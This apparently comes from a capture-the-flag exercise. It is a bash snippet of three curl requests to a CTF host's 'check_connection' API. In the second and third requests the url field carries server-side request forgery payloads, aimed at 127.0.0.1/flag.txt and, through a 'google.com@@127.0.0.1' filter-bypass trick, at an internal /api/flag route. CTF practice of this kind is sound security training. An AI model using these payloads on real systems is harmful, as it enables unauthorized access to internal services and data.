```bash
curl -X POST http://snykctf.ext.hackinghub.com:3000/api/check_connection -H 'Content-type: application/json' -d '{"url": "https://google.com"}'

curl -X POST http://snykctf.ext.hackinghub.com:3000/api/check_connection -H 'Content-type: application/json' -d '{"url": "https://127.0.0.1/flag.txt"}'

curl -X POST -H "Content-Type: application/json" -d '{"url": "http://google.com@@127.0.0.1:3000/api/flag"}' http://localhost:3000/api/check_connection
```